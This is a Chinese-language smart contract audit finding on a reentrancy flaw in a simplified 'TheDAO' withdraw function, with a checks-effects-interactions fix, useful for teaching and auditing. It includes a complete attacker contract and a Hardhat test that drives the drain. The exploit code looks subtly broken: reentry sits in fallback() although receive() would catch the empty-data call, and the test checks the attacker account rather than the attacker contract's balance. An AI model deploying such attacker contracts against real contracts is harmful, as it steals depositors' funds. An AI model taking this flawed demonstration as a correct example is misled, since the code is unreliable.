# 智能合约审计报告

## 漏洞明细

### 合约的 withdraw 函数可以被重入攻击转移全部资产

- **严重性**：高
- **困难度**：低
- **目标**：TheDAO 合约的 withdraw 函数

#### 描述

重入攻击是当攻击者能够在原合约完成所有状态更新之前，多次调用并执行一个函数。在`TheDAO`合约的 `withdraw` 函数中，资金在更新状态变量之前被发送给调用者，这使得调用者可以在单个交易中多次提取资金。

下面是 `TheDAO` 合约的代码片段：

```solidity
contract TheDAO {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed.");
        balances[msg.sender] = 0;
    }
}
```

在 `withdraw` 函数中，首先通过 `call` 方法向调用者发送资金，然后才更新 `balances` 映射。如果调用者是一个恶意合约，其回退函数可以再次调用 `withdraw`，从而在 `balances` 映射被更新之前多次取款。

#### 攻击场景

攻击者创建并部署以下攻击合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./TheDAO.sol";

contract TheDAOAttacker {
    TheDAO public theDAO;
    address payable owner;

    constructor(address theDAOAddress) {
        theDAO = TheDAO(theDAOAddress);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        theDAO.deposit{value: msg.value}();
        theDAO.withdraw();
    }

    // 回退函数，它会在 TheDAO 合约试图将以太币发送回本合约时被调用
    fallback() external payable {
        if (address(theDAO).balance >= msg.value) {
            theDAO.withdraw();
        }
    }

    // 收回攻击获得的以太币
    function collectEther() external {
        owner.transfer(address(this).balance);
    }

    receive() external payable {
    }
}
```

攻击合约的回退函数在接收到资金时再次调用 `withdraw` 函数。通过调用 `attack` 函数，攻击者能够触发重入攻击并多次提款。

为了模拟此攻击，我们可以使用以下测试代码：

```js
const { expect } = require("chai");

describe("TheDAO", function () {
  it("Should perform re-entrancy attack", async function () {
    const [owner, attacker, user1, user2] = await ethers.getSigners();
    
    // 部署目标合约
    const TheDAOFactory = await ethers.getContractFactory("TheDAO");
    const theDAO = await TheDAOFactory.deploy();
    await theDAO.deployed();
    
    // 部署攻击合约
    const TheDAOAttackerFactory = await ethers.getContractFactory("TheDAOAttacker");
    const theDAOAttacker = await TheDAOAttackerFactory.deploy(theDAO.address);
    await theDAOAttacker.deployed();

    // 使用多个地址向目标合约存入以太币
    const depositAmount = ethers.utils.parseEther("1");
    await theDAO.connect(owner).deposit({ value: depositAmount });
    await theDAO.connect(user1).deposit({ value: depositAmount });
    await theDAO.connect(user2).deposit({ value: depositAmount });
    
    // 攻击者通过攻击合约存入1个Ether
    const attackerInitialBalance = await attacker.getBalance();
    await theDAOAttacker.connect(attacker).attack({ value: depositAmount, gasLimit: 4000000 });

    // 检查攻击者的余额，应该大于最初的余额
    const attackerFinalBalance = await attacker.getBalance();
    expect(attackerFinalBalance).to.be.gt(attackerInitialBalance);
  });
});
```

这个测试代码首先部署目标合约和攻击合约。然后使用多个地址向目标合约存入以太币，包括攻击者的地址。接着，攻击者通过调用攻击合约的`attack`函数触发重入攻击。测试代码检查攻击后攻击者的余额，如果攻击成功，攻击者的余额应该大于最初的余额。

#### 推荐修复

为防止重入攻击，建议使用检查-效应-交互的模式。首先更新 `balances` 映射，然后再发送资金。

修复后的代码片段：

```solidity
function withdraw() public {
    uint amount = balances[msg.sender];
    balances[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed.");
}
```

通过首先设置 `balances[msg.sender]` 为0，我们确保即使调用者再次调用`withdraw`函数，`amount`也会为0，从而防止重入攻击。